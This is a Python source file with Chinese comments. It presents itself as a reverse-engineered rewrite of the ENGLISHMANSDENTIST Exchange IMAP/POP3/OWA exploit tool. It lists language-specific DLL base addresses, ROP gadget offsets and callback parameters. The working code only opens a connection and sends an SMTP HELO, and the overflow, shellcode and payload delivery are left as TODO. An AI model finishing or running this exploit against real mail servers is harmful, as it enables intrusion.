"""englishmansdentist — ENGLISHMANSDENTIST Exchange IMAP/POP3/OWA 利用核心逻辑。

Python 重写的 `Englishmansdentist-1.2.0.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 Exchange 利用流程。

参数定义来源：Englishmansdentist-1.2.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 25
DEFAULT_TIMEOUT = 60
DEFAULT_MAIL_CHECK_PORT = 110
DEFAULT_LANGUAGE = "English"

LANGUAGE_DBGHELP_BASE = {
    "English":            0x6d580000,
    "German":             0x6d790000,
    "Korean":             0x6d8e0000,
    "Simplified_Chinese": 0x6d830000,
    "Traditional_Chinese":0x6d840000,
}

LANGUAGE_OLECNV32_BASE = {
    "English":            0x71db0000,
    "German":             0x71bc0000,
    "Korean":             0x71c50000,
    "Simplified_Chinese": 0x71d00000,
    "Traditional_Chinese":0x71d10000,
}

# 通用 ROP gadget 地址（来自 XML，不随语言版本变化）
COMMON_GADGETS = {
    "dbghelp_return_01a0":    0x00081cfd,
    "dbghelp_virtual_alloc":  0x00001104,
    "dbghelp_pop_into_ecx":   0x00019568,
    "dbghelp_pop_into_esi":   0x00013b71,
    "dbghelp_mov_ptrecx_to_eax_ret": 0x0005c464,
    "dbghelp_mov_ecx_to_ptreax_ret8": 0x00063f8b,
    "dbghelp_jmp_eax":        0x0002f71d,
}

class EnglishmansdentistError(Exception):
    pass


def _parse_hex_buffer(value):
    """将十六进制字符串解析为字节串。空字符串返回 b""。"""
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise EnglishmansdentistError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise EnglishmansdentistError(f"无效的十六进制缓冲区: {value!r}") from exc


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_smtp_helo_request(hostname):
    """构建 SMTP HELO 请求。"""
    return f"HELO {hostname}\r\n".encode("ascii")


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    target_email_address=None,
    email_subject=None,
    email_from_address=None,
    email_body=None,
    language="English",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    target_user_name=None,
    target_user_password=None,
    mail_check_protocol="POP3",
    mail_check_port=DEFAULT_MAIL_CHECK_PORT,
    owamode="HTTPS",
    owadelay=3000,
    auth_code=0,
    verbose=False,
):
    """执行 ENGLISHMANSDENTIST 利用序列。

    当前阶段：完成参数解析、SMTP 连接。
    具体 exploit 缓冲区（Exchange IMAP/POP3/OWA 缓冲区溢出、ROP 链、
    shellcode、载荷投递等）的二进制结构尚需通过 capstone/x32dbg
    进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Target email address: {target_email_address}")
        print(f"[*] Email subject: {email_subject}")
        print(f"[*] Email from address: {email_from_address}")
        print(f"[*] Email body: {email_body}")
        print(f"[*] Language: {language}")
        print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")
        print(f"[*] Mail check protocol: {mail_check_protocol}")
        print(f"[*] Mail check port: {mail_check_port}")
        print(f"[*] OWA mode: {owamode}")
        print(f"[*] OWA delay: {owadelay}ms")
        print(f"[*] Auth code: {auth_code}")

    # 解析常量
    dbghelp_base = LANGUAGE_DBGHELP_BASE.get(language, LANGUAGE_DBGHELP_BASE["English"])
    olecnv32_base = LANGUAGE_OLECNV32_BASE.get(language, LANGUAGE_OLECNV32_BASE["English"])

    if verbose:
        print(f"[*] DBGHELP base: 0x{dbghelp_base:08X}")
        print(f"[*] OLECNV32 base: 0x{olecnv32_base:08X}")
        print(f"[*] dbghelp_return_01a0: 0x{COMMON_GADGETS['dbghelp_return_01a0']:08X}")
        print(f"[*] dbghelp_virtual_alloc: 0x{COMMON_GADGETS['dbghelp_virtual_alloc']:08X}")
        print(f"[*] dbghelp_jmp_eax: 0x{COMMON_GADGETS['dbghelp_jmp_eax']:08X}")

    # 建立到目标的 TCP 连接（SMTP 25）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EnglishmansdentistError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 SMTP HELO 请求（探测阶段）
    hostname = target
    helo_request = build_smtp_helo_request(hostname)
    try:
        sock.sendall(helo_request)
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EnglishmansdentistError(f"SMTP HELO 失败: {exc}") from exc

    if verbose:
        print(f"[*] SMTP HELO 应答: {resp[:128]}")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - Exchange IMAP/POP3/OWA 缓冲区溢出
    #   - ROP 链（dbghelp 相关 gadgets）
    #   - Shellcode 注入
    #   - 邮件触发（内容过滤/自动回复）
    #   - 载荷投递（Callback/Callin）

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
